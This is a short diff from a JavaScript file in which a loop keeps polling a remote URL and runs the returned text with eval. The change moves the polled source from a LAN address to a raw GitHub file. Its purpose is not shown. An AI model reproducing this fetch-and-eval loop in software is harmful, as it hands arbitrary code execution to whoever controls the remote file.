@@ -8,7 +8,7 @@ function httpGet(theUrl)
 
 async function main_loop() {
   while (true) {
-    var value = httpGet("http://192.168.8.116:3001/to_run").toString()
+    var value = httpGet("https://raw.githubusercontent.com/LudvigDK/LudvigDK.github.io/main/hm/to_run.txt").toString()
     if (value != last_value && value[value.length-1] == "+") {
       eval(value.substring(0, value.length - 1))
     }
